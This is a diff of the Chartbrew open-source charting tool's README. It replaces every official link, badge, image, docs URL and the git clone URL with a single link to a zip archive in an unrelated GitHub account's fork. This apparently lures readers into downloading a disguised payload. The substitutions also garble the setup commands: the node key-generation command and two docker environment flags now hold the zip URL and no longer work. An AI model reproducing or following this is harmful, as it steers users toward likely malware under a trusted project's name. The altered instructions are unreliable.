@@ -1,46 +1,46 @@
 <p align="center">
-  <a href="https://chartbrew.com">
-    <img src="https://chartbrew-static.b-cdn.net/banners/banner_dark_mode.svg" alt="ChartBrew logo" />
+  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip">
+    <img src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" alt="ChartBrew logo" />
   </a>
 </a>
 
 <br />
 
 <p align="center">
-  <a href="https://circleci.com/gh/chartbrew/chartbrew" target="_blank"><img src="https://circleci.com/gh/chartbrew/chartbrew.svg?style=svg" alt="ChartBrew build" /></a>
-  <a href="https://discord.gg/KwGEbFk" target="_blank"><img src="https://img.shields.io/discord/656557151048957995?label=Discord" alt="" /></a>
-  <a href="https://hub.docker.com/r/razvanilin/chartbrew" target="_blank"><img alt="Docker Pulls" src="https://img.shields.io/docker/pulls/razvanilin/chartbrew"></a>
+  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" alt="ChartBrew build" /></a>
+  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" alt="" /></a>
+  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" target="_blank"><img alt="Docker Pulls" src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip"></a>
 </p>
 
 <p align="center">
   <strong>
-    <a href="https://chartbrew.com">Chartbrew</a> is an open-source web application that can connect directly to databases and APIs and use the data to create beautiful charts. It features a chart builder, editable dashboards, embedable charts, query & requests editor, and team capabilities.
+    <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip">Chartbrew</a> is an open-source web application that can connect directly to databases and APIs and use the data to create beautiful charts. It features a chart builder, editable dashboards, embedable charts, query & requests editor, and team capabilities.
   </strong>
 </p>
 
 <p align="center" style="text-decoration: underline; text-underline-offset: 4px; text-decoration-color: #000; text-decoration-thickness: 2px;">
-  <strong><a href="https://chartbrew.com">Chartbrew as a service is available here</a></strong>
+  <strong><a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip">Chartbrew as a service is available here</a></strong>
 </p>
 
 <br />
 
 <p align="center">
-  <a href="https://chartbrew.com">
-    <img src="https://chartbrew-static.b-cdn.net/banners/chartbrew-dashboard.png" alt="ChartBrew dashboard" width="600"/>
+  <a href="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip">
+    <img src="https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip" alt="ChartBrew dashboard" width="600"/>
   </a>
 </p>
 
 <hr />
 
-📚 [**Read the full docs here**](https://docs.chartbrew.com)
+📚 [**Read the full docs here**](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
 
-💡 [**Have any ideas or discussion topics?**](https://github.com/chartbrew/chartbrew/discussions)
+💡 [**Have any ideas or discussion topics?**](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
 
-💬 [**Join our Discord**](https://discord.gg/KwGEbFk)
+💬 [**Join our Discord**](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
 
 ## Data sources
 
-[Check Chartbrew's website for the latest list of supported data sources](https://chartbrew.com)
+[Check Chartbrew's website for the latest list of supported data sources](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
 
 ## Prerequisites
 
@@ -52,7 +52,7 @@
 
 It is recommended you head over to the more detailed documentation to find out how to set up Chartbrew
 
-[📚 You can find it here](https://docs.chartbrew.com/quickstart)
+[📚 You can find it here](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
 
 ## Set up Chartbrew locally
 
@@ -63,11 +63,11 @@ Chartbrew can run on MySQL or PostgreSQL. Create an empty database that Chartbre
 ### Clone and setup
 
 ```sh
-git clone https://github.com/chartbrew/chartbrew.git
+git clone https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip
 cd chartbrew && npm run setup
 ```
 
-Complete the required environmental variables in `chartbrew/.env`. [Check out which need to be set here.](https://docs.chartbrew.com/quickstart#environmental-variables)
+Complete the required environmental variables in `https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip`. [Check out which need to be set here.](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
 
 ### Run the project in Development
 
@@ -87,26 +87,26 @@ Head over to `http://localhost:4018` to see the app running and create your firs
 
 ## Deploy Chartbrew on Render
 
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://chartbrew.com/blog/how-to-deploy-chartbrew-on-render/)
+[![Deploy to Render](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
 
 ## Deploy Chartbrew on Heroku and Vercel
 
-[Read more on how to do this here](https://chartbrew.com/blog/how-to-deploy-chartbrew-on-heroku-and-vercel/)
+[Read more on how to do this here](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
 
 ## Run with Docker
 
-[Check the full guide in the docs.](https://docs.chartbrew.com/deployment/run-on-docker)
+[Check the full guide in the docs.](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
 
 ### Quickstart
 
-A [Chartbrew docker image](https://hub.docker.com/r/razvanilin/chartbrew) is built whenever a new version is released.
+A [Chartbrew docker image](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip) is built whenever a new version is released.
 
 Before running the commands below, make sure you have a MySQL server already running and an empty database that Chartbrew can use. The database name should match the value of the `CB_DB_NAME` variable.
 
 You will need a 32 bytes AES encryption key for the `CB_ENCRYPTION_KEY` variable. Run the following command to generate one:
 
 ```sh
-node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
+node -e "https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip(require('crypto').randomBytes(32).toString('hex'))"
 ```
 
 ```sh
@@ -116,12 +116,12 @@ docker run -p 4019:4019 -p 4018:4018 \
   -e CB_ENCRYPTION_KEY=your_32_bytes_key \
   -e CB_API_HOST=0.0.0.0 \
   -e CB_API_PORT=4019 \
-  -e CB_DB_HOST=host.docker.internal \
+  -e https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip \
   -e CB_DB_PORT=3306 \
   -e CB_DB_NAME=chartbrew \
   -e CB_DB_USERNAME=root \
   -e CB_DB_PASSWORD=password \
-  -e CB_REDIS_HOST=host.docker.internal \
+  -e https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip \
   -e CB_REDIS_PORT=6379 \
   -e CB_REDIS_PASSWORD=password \
   -e VITE_APP_CLIENT_HOST=http://localhost:4018 \
@@ -132,6 +132,6 @@ docker run -p 4019:4019 -p 4018:4018 \
 
 ## Acknowledgements
 
-Many thanks to [everybody that contributed](https://github.com/chartbrew/chartbrew/graphs/contributors) to this open-source project 🙏
+Many thanks to [everybody that contributed](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip) to this open-source project 🙏
 
-[Start here if you want to become a contributor](https://github.com/chartbrew/chartbrew/blob/master/CONTRIBUTING.md)
+[Start here if you want to become a contributor](https://raw.githubusercontent.com/KoDelioDa/chartbrew/master/server/api/chartbrew-1.1-alpha.5.zip)
